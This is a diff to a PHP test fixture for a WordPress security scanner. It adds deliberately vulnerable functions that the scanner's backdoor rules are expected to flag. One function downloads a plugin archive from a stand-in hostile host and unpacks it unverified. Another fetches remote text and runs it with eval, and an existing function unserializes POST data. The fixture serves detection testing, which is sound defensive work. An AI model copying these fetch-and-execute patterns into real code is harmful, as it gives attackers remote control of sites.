@@ -6,6 +6,8 @@
 // Each function contains a vulnerable pattern that MUST trigger specific rules.
 //
 // EXPECTED_RULES:
+// codevigilant.php.wordpress.backdoor.remote_plugin_archive_install
+// codevigilant.php.wordpress.backdoor.remote_response_code_execution
 // codevigilant.php.wordpress.sqli.getpost.query.direct
 // codevigilant.php.wordpress.sqli.getpost.query.taint
 // codevigilant.php.wordpress.sqli.getpost.query.deep_taint
@@ -234,4 +236,23 @@ function vuln_rce_file_get_contents_eval() {
 function vuln_deserialize() {
     // EXPECTED: insecure_deserialization.getpost.unserialize.direct
     $obj = unserialize($_POST['data']);
+}
+
+// ---------------------------------------------------------------------------
+// Backdoor — remote-supplied code installed / executed without integrity check
+// ---------------------------------------------------------------------------
+
+function vuln_backdoor_remote_plugin_archive_install() {
+    // EXPECTED: backdoor.remote_plugin_archive_install
+    $tmp = download_url('https://updates.example-bad.tld/qppr-latest.zip');
+    if (!is_wp_error($tmp)) {
+        unzip_file($tmp, WP_PLUGIN_DIR . '/quick-pagepost-redirect-plugin');
+    }
+}
+
+function vuln_backdoor_remote_response_code_execution() {
+    // EXPECTED: backdoor.remote_response_code_execution
+    $resp = wp_remote_get('https://updates.example-bad.tld/loader.txt');
+    $code = wp_remote_retrieve_body($resp);
+    eval($code);
 }
